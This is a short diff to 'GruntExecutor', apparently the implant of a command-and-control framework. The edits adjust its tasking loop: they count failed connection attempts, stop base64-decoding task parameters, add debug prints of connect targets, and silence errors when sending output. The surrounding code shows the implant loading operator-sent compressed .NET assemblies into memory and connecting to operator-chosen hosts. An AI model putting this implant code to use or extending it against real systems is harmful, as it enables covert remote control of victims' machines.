@@ -107,7 +107,11 @@ namespace GruntExecutor
                     try
                     {
                         GruntTaskingMessage message = messenger.ReadTaskingMessage();
-                        if (message != null)
+                        if (message == null)
+                        {
+                            ConnectAttemptCount++;
+                        }
+                        else
                         {
                             ConnectAttemptCount = 0;
                             string output = "";
@@ -218,7 +222,7 @@ namespace GruntExecutor
                     {
                         object[] parameters = null;
                         if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }
-                        for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
+                        for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = pieces[i]; }
                         byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
                         byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
                         Assembly gruntTask = Assembly.Load(decompressedBytes);
@@ -229,6 +233,8 @@ namespace GruntExecutor
                 else if (message.Type == GruntTaskingType.Connect)
                 {
                     string[] split = message.Message.Split(',');
+                    Console.WriteLine("split: " + split.Length);
+                    Console.WriteLine(split[0] + " " + split[1]);
                     bool connected = messenger.Connect(split[0], split[1]);
                     output += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
                                           "Connection to " + split[0] + ":" + split[1] + " failed.";
@@ -245,7 +251,11 @@ namespace GruntExecutor
             }
             finally
             {
-                messenger.WriteTaskingMessage(output, message.Name);
+                try
+                {
+                    messenger.WriteTaskingMessage(output, message.Name);
+                }
+                catch (Exception) { }
             }
             return WindowsIdentity.GetCurrent().Token;
         }
